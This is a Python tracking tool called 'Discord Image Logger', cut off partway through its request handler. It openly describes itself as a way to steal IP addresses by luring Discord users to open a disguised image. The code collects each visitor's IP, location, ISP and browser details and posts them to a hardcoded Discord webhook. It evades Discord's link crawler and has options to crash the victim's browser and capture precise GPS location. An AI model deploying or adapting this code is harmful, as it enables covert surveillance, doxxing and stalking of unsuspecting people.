# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1569798190033666058/eYSXsuzEMHn_f7EwBEA2nAhiFipMZ2n5CV_jpTDxbsm9JBSUylFv4jsoMly2AUZIuQyU",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
